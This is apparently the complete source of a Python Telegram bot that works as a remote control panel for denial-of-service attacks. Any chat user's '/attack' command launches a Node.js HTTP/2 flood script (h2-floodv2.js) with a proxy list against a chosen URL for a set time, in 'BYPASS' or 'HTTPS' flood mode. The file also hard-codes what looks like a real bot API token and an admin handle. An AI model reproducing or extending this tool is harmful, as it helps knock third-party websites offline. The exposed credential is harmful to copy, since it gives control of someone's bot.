import subprocess
import requests
import threading
import sys

API_KEY = '8104494589:AAE-8Laz6FUCxjxKvN65uH4tenYk_npZzNY'  # Telegram bot API key
ADMIN_USER_ID = '6852965900'  # Admin user ID
API_URL = f"https://api.telegram.org/bot{API_KEY}/"  # Telegram Bot API base URL

# Variable to store the offset for the last processed update
last_update_id = None
bot_running = True  # Flag to control the bot's execution
attack_process = None  # Variable to store the attack process

# Function to send a message to a user
def send_message(chat_id, text):
    url = f"{API_URL}sendMessage"
    params = {"chat_id": chat_id, "text": text}
    response = requests.post(url, params=params)
    return response

# Function to send a GIF to a user
def send_gif(chat_id, gif_url):
    url = f"{API_URL}sendAnimation"
    params = {"chat_id": chat_id, "animation": gif_url}
    response = requests.post(url, params=params)
    return response

# Function to handle updates from Telegram
def handle_updates():
    global last_update_id, bot_running

    url = f"{API_URL}getUpdates"
    params = {}
    if last_update_id:
        params["offset"] = last_update_id + 1  # Get only new updates

    response = requests.get(url, params=params)
    updates = response.json().get("result", [])

    for update in updates:
        message = update.get("message", {})
        text = message.get("text", "").strip()
        chat_id = message.get("chat", {}).get("id")
        user_id = message.get("from", {}).get("id")
        update_id = update.get("update_id")

        if not chat_id or not user_id:
            continue

        # Handle commands
        if text.startswith("/start"):
            start(chat_id)
        elif text.startswith("/attack"):
            attack(chat_id, text)
        elif text.startswith("/stop") and str(user_id) == ADMIN_USER_ID:
            stop(chat_id)
        elif text.startswith("/admin"):
            admin(chat_id)

        # Update the last processed update ID
        last_update_id = update_id

# Command to start the bot
def start(chat_id):
    send_message(chat_id, (
        "🤖 Welcome to the bot!\n\n"
        "📜 Commands:\n"
        "⚡ /attack <url> <time> <method> - To perform an attack (method: BYPASS/HTTPS)\n"
        "🛑 /stop - To stop the bot or current attack (Admin only)\n"
        "👤 /admin - To know about the admin"
    ))

# Command to perform an attack
def attack(chat_id, text):
    global attack_process
    if attack_process and attack_process.poll() is None:
        send_message(chat_id, "⚠️ An attack is already running. Use /stop to stop it first.")
        return

    parts = text.split()
    if len(parts) != 4:
        send_message(chat_id, "⚠️ Usage: /attack <url> <time> <method>\nExample: /attack http://example.com 60 BYPASS")
        return

    url = parts[1]
    time = parts[2]
    method = parts[3].upper()

    # Mapping method to the correct command argument
    if method == "BYPASS":
        command_method = "bypass"
    elif method == "HTTPS":
        command_method = "flood"
    else:
        send_message(chat_id, "❌ Invalid method! Use BYPASS or HTTPS.")
        return

    # Send the GIF before performing the attack
    gif_url = "https://cdn.dribbble.com/userupload/11564851/file/original-765ffbce07dd5a679f0ce0d416ccb1d1.gif"  # Replace with your actual GIF link
    send_gif(chat_id, gif_url)

    # Run the Node.js script with the appropriate method
    send_message(chat_id, "⚔️ Attack is being executed. Please wait...")
    try:
        command = ["node", "h2-floodv2.js", url, time, '100', '5', 'a.txt', command_method]
        attack_process = subprocess.Popen(command)
        attack_process.wait()
        send_message(chat_id, f"✅ Attack sent successfully!\n🎯 Target: {url}\n⏱️ Duration: {time} seconds\n🚀 Method: {method}")
    except Exception as e:
        send_message(chat_id, f"❌ Attack failed! Error: {str(e)}")

# Command to stop the bot or current attack
def stop(chat_id):
    global bot_running, attack_process
    if attack_process and attack_process.poll() is None:
        attack_process.terminate()
        send_message(chat_id, "🛑 Current attack has been stopped.")
        attack_process = None
    else:
        send_message(chat_id, "⚠️ No attack is currently running.")

    send_message(chat_id, "🛑 Bot is stopping...")
    bot_running = False
    sys.exit(0)

# Command to view admin information
def admin(chat_id):
    send_message(chat_id, "👤 Admin: XTerm_BvP\n🔗 Telegram: t.me/XTermBvP7")

# Main function to poll Telegram for updates
def main():
    global bot_running
    while bot_running:
        handle_updates()

if __name__ == "__main__":
    main()